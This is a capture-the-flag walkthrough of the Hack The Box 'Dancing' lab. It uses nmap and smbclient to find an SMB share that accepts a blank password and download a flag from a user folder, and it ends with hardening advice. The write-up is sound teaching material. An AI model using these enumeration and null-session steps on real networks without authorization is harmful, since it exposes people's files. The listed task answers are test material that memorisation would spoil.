# HTB Starting Point — "Dancing" (Windows)

**Category:** Starting Point (Tier 0)  
**Difficulty:** Very Easy  
**OS:** Windows  
**XP reward:** 150

---

## Challenge Description

Dancing is the fourth machine of the Hack The Box Starting Point track. It introduces **SMB (Server Message Block)**, the protocol Windows uses for file and printer sharing, and shows what happens when a share is left accessible **without a password**.

The machine is spawned as a target reachable through the VPN:

```text
<TARGET_IP>
```

> The IP changes every time the machine is respawned.

---

## Tooling

- `openvpn` — to connect to the HTB lab network
- `ping` — to test connectivity with the target
- `nmap` — to discover open ports and identify services
- `smbclient` — command-line client to list and access SMB shares

---

## Guided Questions (Tasks 1–7)

| Task | Question | Answer |
|------|----------|--------|
| 1 | What does the 3-letter acronym **SMB** stand for? | `Server Message Block` |
| 2 | What port does SMB use to operate at? | `445` |
| 3 | Service name for port 445 in the Nmap scan? | `microsoft-ds` |
| 4 | Flag/switch of `smbclient` used to list the available SMB shares? | `-L` |
| 5 | How many shares are there on Dancing? | `4` |
| 6 | Name of the share accessible with a blank password? | `WorkShares` |
| 7 | Command within the SMB shell to download the files found? | `get` |

---

## Recon: Connecting to the Lab

Connect to the HTB network with the VPN configuration file downloaded from the platform (here, the *EU StartingPoint 2* server):

```bash
sudo openvpn starting_point_<username>.ovpn
```

Then check that the target is reachable:

```bash
ping -c 4 <TARGET_IP>
```

```text
64 bytes from <TARGET_IP>: icmp_seq=1 ttl=127 time=...
```

Replies come back, and the TTL close to 128 already hints at a Windows host.

---

## Port Scanning

Scan the target with `nmap`, using default scripts (`-sC`) and version detection (`-sV`):

```bash
nmap -sC -sV <TARGET_IP>
```

```text
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
5985/tcp open http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key findings:

- **445/tcp** is open, and Nmap labels the service as **microsoft-ds**, which is SMB running directly over TCP.
- Other typical Windows services are exposed (RPC on 135, NetBIOS on 139, WinRM on 5985).

SMB is a client-server protocol used to share files, printers and other resources over a network. It is the backbone of Windows file sharing.

---

## Enumerating SMB Shares

List the available shares with `smbclient`. The `-L` switch asks the server to list its shares, and pressing **Enter** at the password prompt sends a blank password:

```bash
smbclient -L <TARGET_IP>
```

```text
Password for [WORKGROUP\user]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
SMB1 disabled -- no workgroup available
```

There are **4 shares**:

- `ADMIN$`, `C$`, `IPC$` — default administrative shares, normally protected.
- `WorkShares` — a custom share, which is the interesting one.

---

## Gaining Access

Try to connect to each share with a blank password. The administrative shares refuse the connection:

```bash
smbclient \\\\<TARGET_IP>\\ADMIN$
```

```text
tree connect failed: NT_STATUS_ACCESS_DENIED
```

```bash
smbclient \\\\<TARGET_IP>\\C$
```

```text
tree connect failed: NT_STATUS_ACCESS_DENIED
```

But **WorkShares** accepts the blank password:

```bash
smbclient \\\\<TARGET_IP>\\WorkShares
```

```text
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \>
```

We now have an SMB shell on the share.

---

## Getting the Flag

List the content of the share:

```text
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021
```

Two user folders are present. Explore them:

```text
smb: \> cd Amy.J
smb: \Amy.J\> ls
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

smb: \> cd ..\James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021
```

The `flag.txt` file is in **James.P**'s folder. Download it with `get`:

```text
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt
smb: \James.P\> exit
```

Then read it locally:

```bash
cat flag.txt
```

```text
HTB{REDACTED}
```

Submit it in the **Submit Flag** field on the platform to own the machine.

---

## Takeaways

- **Shares left open without authentication are a serious exposure.** A custom share (`WorkShares`) accessible with a blank password gave access to users' files with no credentials at all.
- **Always test every share individually.** Administrative shares (`ADMIN$`, `C$`) correctly denied access, but one misconfigured custom share was enough.
- **Enumeration is the key step.** `nmap` revealed port 445, and `smbclient -L` revealed the shares; no exploit was needed.
- **Shared files often contain sensitive data** (notes, credentials, personal documents), which can be used to pivot to further access.
- **Hardening checklist:** disable null/guest sessions, require authentication on all shares, apply least-privilege permissions, block port 445 from untrusted networks with a firewall, and audit shares regularly.
